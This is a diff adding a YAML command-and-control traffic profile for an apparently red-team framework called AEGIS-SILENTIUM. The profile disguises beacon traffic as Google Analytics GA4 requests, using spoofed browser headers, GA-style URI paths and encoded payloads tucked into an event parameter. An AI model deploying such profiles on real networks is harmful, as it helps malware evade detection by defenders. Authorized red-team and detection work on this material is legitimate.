@@ -1,0 +1,46 @@
+# AEGIS-SILENTIUM Malleable C2 Profile — Google Analytics Mimicry
+# Transforms beacon traffic to statistically resemble GA4 measurement protocol
+# requests. URI paths, headers, and payload encoding mirror real GA4 traffic.
+# ──────────────────────────────────────────────────────────────────────────────
+# AUTHORIZED USE ONLY
+
+name: google-analytics-ga4
+version: "1.0"
+
+default_headers:
+  User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+  Accept: "*/*"
+  Accept-Language: "en-US,en;q=0.9"
+  Accept-Encoding: "gzip, deflate, br"
+  Origin: "https://www.google.com"
+  Referer: "https://www.google.com/"
+  Connection: "keep-alive"
+  Sec-Fetch-Dest: "empty"
+  Sec-Fetch-Mode: "cors"
+  Sec-Fetch-Site: "cross-site"
+
+uris:
+  - /g/collect
+  - /gtag/js
+  - /analytics/collect
+  - /health
+
+# GA4 measurement protocol uses URL-encoded POST bodies with named parameters.
+# We embed our payload in the "epn.session_data" custom event parameter.
+client:
+  container: json
+  key: "session_data"
+  transforms:
+    - op: gzip
+    - op: base64url      # URL-safe base64 (no padding issues in POST body)
+    - op: prepend
+      arg: "v=2&tid=G-XXXXXXXX&cid="
+    - op: append
+      arg: "&en=page_view&ep.page_location=https%3A%2F%2Fwww.example.com%2F"
+
+server:
+  container: json
+  key: "r"
+  transforms:
+    - op: gzip
+    - op: base64url
